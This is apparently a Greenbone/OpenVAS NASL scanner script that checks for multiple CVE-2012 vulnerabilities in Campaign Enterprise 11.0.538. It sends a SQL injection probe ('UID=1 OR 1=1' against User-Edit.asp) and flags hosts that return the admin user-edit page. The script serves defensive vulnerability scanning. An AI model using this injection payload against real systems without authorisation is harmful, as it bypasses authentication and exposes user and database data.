if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103586" );
	script_bugtraq_id( 56117 );
	script_cve_id( "CVE-2012-3820", "CVE-2012-3821", "CVE-2012-3822", "CVE-2012-3823", "CVE-2012-3824" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Campaign Enterprise Multiple Security Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56117" );
	script_xref( name: "URL", value: "http://www.arialsoftware.com/enterprise.htm" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-10-22 13:15:10 +0200 (Mon, 22 Oct 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "Campaign Enterprise is prone to multiple security vulnerabilities
including:

1. Multiple security-bypass vulnerabilities

2. Multiple information-disclosure vulnerabilities

3. Multiple SQL injection vulnerabilities" );
	script_tag( name: "impact", value: "Attackers can exploit these issues to bypass certain security
restrictions, obtain sensitive information, and carry out
unauthorized actions on the underlying database. Other attacks may
also be possible." );
	script_tag( name: "affected", value: "Campaign Enterprise 11.0.538 is vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/User-Edit.asp?UID=1%20OR%201=1";
	if(http_vuln_check( port: port, url: url, pattern: "<title>Campaign Enterprise", extra_check: make_list( ">Logout</a>",
		 "Edit User",
		 "Admin Rights" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

